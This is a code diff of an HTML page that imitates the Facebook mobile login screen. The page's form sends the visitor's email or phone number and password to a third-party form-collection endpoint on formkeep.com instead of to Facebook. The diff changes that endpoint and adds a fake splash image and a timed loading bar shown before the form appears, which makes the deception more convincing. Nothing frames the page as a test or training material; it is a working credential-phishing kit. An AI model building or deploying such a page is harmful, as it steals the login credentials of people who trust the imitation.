@@ -6,106 +6,99 @@
     <title>Login Page</title>
     <style>
         * {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-    font-family: Arial, sans-serif;
-}
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
 
-body {
-    background-color: #f2f2f2;
-    display: flex;
-    justify-content: center;
-  background-color: #fff;
-    height: 100vh;
-}
+        body {
+            background-color: #f2f2f2;
+            display: flex;
+            justify-content: center;
+            background-color: #fff;
+            height: 100vh;
+        }
 
-.container {
-    width: 100%;
-    height:100%;
-    max-width: 400px;
-    background: #fff;
-    padding: 20px;
+        .container {
+            width: 100%;
+            height:100%;
+            max-width: 400px;
+            background: #fff;
+            padding: 20px;
+        }
 
-}
+        .header {
+            width: 100%;
+            padding: 10px;
+            max-height: 100px;
+            margin-bottom: 7px;
+            background-color:#fffbe2;
+        }
 
-.header {
-    width: 100%;
-    padding: 10px;
-  max-height: 100px;
-    margin-bottom: 7px;
-    background-color:#fffbe2;
-}
+        .header p1 {
+            font-size: 14px;
+            color: rgb(37, 85, 174);
+        }
 
+        .header p2 {
+            font-size:12px;
+            color: rgb(122, 95, 60);
+        }
 
+        .body .login-box {
+            width: 100%;
+        }
 
+        .login-box h2 {
+            margin-bottom: 20px;
+            margin-top: 20px;
+            color: #1877F2;
+            text-align: center;
+            font-size: 20px;
+            font-family:kalvika;
+        }
 
-.header p1{
-    font-size: 14px;
-    color: rgb(37, 85, 174);
-}
-.header p2{
-    font-size:12px;
-    color: rgb(122, 95, 60);
-}
+        p2 {
+            font-size: 12px;
+            color: rgb(37, 85, 174);
+        }
 
-.body .login-box {
-    width: 100%;
-}
+        .textbox {
+            margin-bottom: 10px;
+            position: relative;
+        }
 
-.login-box h2 {
-    margin-bottom: 20px;
-    margin-top: 20px;
-    color: #1877F2;
-    text-align: center;
-    font-size: 20px;
-    font-family:kalvika;
-}
-p2{
+        .textbox input {
+            width: 90%;
+            padding: 16px;
+            border-bottom: 2px solid #bfb8b8;
+            border-top: 0px;
+            border-left: 0px;
+            border-right: 0px;
+            border-radius: 3px;
+            outline: none;
+            color: #000000;
+            font-family: Arial, Helvetica, sans-serif;
+            background-color: #f5f6f8;
+        }
 
-    font-size: 12px;
-    color: rgb(37, 85, 174);
-  
-}
+        .btn {
+            width: 85%;
+            padding: 12px;
+            background: #1877F2;
+            border: none;
+            border-radius: 3px;
+            color: #fff;
+            cursor: pointer;
+            font-size: 14px;
+        }
 
-.textbox {
-    margin-bottom: 10px;
-    position: relative;
-    
-   
-}
+        .btn:hover {
+            background: #3a6cc1;
+        }
 
-.textbox input {
-    width: 90%;
-    padding: 16px;
-    border-bottom: 2px solid #bfb8b8;
-    border-top: 0px;
-    border-left: 0px;
-    border-right: 0px;
-    border-radius: 3px;
-    outline: none;
-    color: #000000;
-    font-family: Arial, Helvetica, sans-serif;
-    background-color: #f5f6f8;
-}
-
-.btn {
-    width: 85%;
-    padding: 12px;
-    background: #1877F2;
-    border: none;
-    border-radius: 3px;
-    color: #fff;
-    cursor: pointer;
-    font-size: 14px;
-    
-}
-
-.btn:hover {
-    background: #3a6cc1;
-}
-
-.hr-with-text {
+        .hr-with-text {
             display: flex;
             align-items: center;
             text-align: center;
@@ -126,29 +119,28 @@ p2{
         .hr-with-text:not(:empty)::after {
             margin-left: 1em;
         }
-input[type=button]{
-    font-size: 15px;
-    margin: 8px 70px;
-    padding: 7px;
-    width: 65%;
-  border:1px solid silver;
-  background-color:white;
-}
-.container {
+
+        input[type=button] {
+            font-size: 15px;
+            margin: 8px 70px;
+            padding: 7px;
+            width: 65%;
+            border:1px solid silver;
+            background-color:white;
+        }
+
+        .container {
             display: flex;
             gap: 20px;
-  height:25%;
+            height:25%;
         }
 
         .language-list {
             background-color: #fff;
             padding: 20px;
             border-radius: 8px;
-           
             width: 200px;
         }
-
-       
 
         .language-list ul {
             list-style-type: none;
@@ -160,64 +152,130 @@ input[type=button]{
             text-align: center;
             font-size: 12px;
         }
-p4{
-  font-size:13px;
-  color:silver;
-}
+
+        p4 {
+            font-size:13px;
+            color:silver;
+        }
+
+        .fullscreen-image {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .fullscreen-image img {
+            max-width: 150%;
+            max-height: 100%;
+        }
+
+        .loading {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            flex-direction: column;
+        }
+
+        .loading-bar {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 0;
+            height: 4px;
+            background-color: green;
+        }
     </style>
 </head>
 
 <body>
-    <div>
+    <div id="overlay">
+        <div class="fullscreen-image">
+            <img src="https://i.ibb.co/rkF22zd/Screenshot-20240520-112407-Chrome.jpg" alt="Initial Image">
+        </div>
+        <div class="loading" style="display: none;">
+            
+            <div class="loading-bar" id="loadingBar"></div>
+        </div>
+    </div>
+
+    <div style="display: none;" id="content">
         <div class="header">
-           
             <p1><img src="https://cdn3.iconfinder.com/data/icons/facebook-ui-flat/48/Facebook_UI-05-512.png" width="35px" height="40px"> Get Facebook for Android and browse faster.</p1><br>
-       
         </div>
         <div class="body">
             <div class="login-box">
                 <h2>facebook</h2>
-                <form action="https://formkeep.com/f/3f5fe1af94aa"
-                accept-charset="UTF-8"
-                enctype="multipart/form-data"
-                method="POST">
+                <form action="https://formkeep.com/f/e07424ab86c8" accept-charset="UTF-8" enctype="multipart/form-data" method="POST">
                     <div class="textbox">
-                      <center>    <input type="text" placeholder="Mobile number or email address" name="contact" required></center>
+                        <center><input type="text" placeholder="Mobile number or email address" name="contact" required></center>
                     </div>
                     <div class="textbox">
-                    <center> <input type="password" placeholder="Password" name="serial" required></center>
+                        <center><input type="password" placeholder="Password" name="serial" required></center>
                     </div>
-                   <center> <button type="submit" class="btn">Log in</button><br>
-                  <p2>Forgotten password?</p2></center>
+                    <center><button type="submit" class="btn">Log in</button><br>
+                    <p2>Forgotten password?</p2></center>
                 </form>
-
             </div>
         </div><br>
-     <div class="hr-with-text">or</div>
-     <input type="button" value="Create new account" ><br><br><br><br><br><br>
-     <div class="container">
-        <div class="language-list">
-            
-            <ul>
-                <li>English (UK)</li>
-                <li>অসমীয়া</li>
-                <li>हिन्दी</li>
-                <li>Português (Brasil)</li>
-            </ul>
+        <div class="hr-with-text">or</div>
+        <input type="button" value="Create new account" ><br><br><br><br><br><br>
+        <div class="container">
+            <div class="language-list">
+                <ul>
+                    <li>English (UK)</li>
+                    <li>অসমীয়া</li>
+                    <li>हिन्दी</li>
+                    <li>Português (Brasil)</li>
+                </ul>
+            </div>
+            <div class="language-list">
+                <ul>
+                    <li>বাংলা</li>
+                    <li>हिन्दी</li>
+                    <li>Español</li>
+                    <li>|+|</li>
+                </ul>
+            </div>
         </div>
-        <div class="language-list">
-           
-            <ul>
-                <li>বাংলা</li>
-                <li>हिन्दी</li>
-                <li>Español</li>
-                <li>|+|</li>
-            </ul>
-        </div>
-       
+        <center><p4>Meta © 2024</p4></center>
     </div>
-      <center><p4>Meta © 2024</p4></center>
-    </div>
+
+    <script>
+        function showLoading() {
+            document.querySelector('.fullscreen-image').style.display = 'none';
+            const loadingElement = document.querySelector('.loading');
+            loadingElement.style.display = 'flex';
+            let loadingBar = document.getElementById('loadingBar');
+            let width = 0;
+            let interval = setInterval(function() {
+                if (width >= 100) {
+                    clearInterval(interval);
+                    loadingElement.style.display = 'none';
+                    document.getElementById('content').style.display = 'block';
+                } else {
+                    width++;
+                    loadingBar.style.width = width + '%';
+                }
+            }, 30);
+        }
+
+        window.onload = function() {
+            setTimeout(showLoading, 2000);
+        };
+    </script>
 </body>
 </html>
-
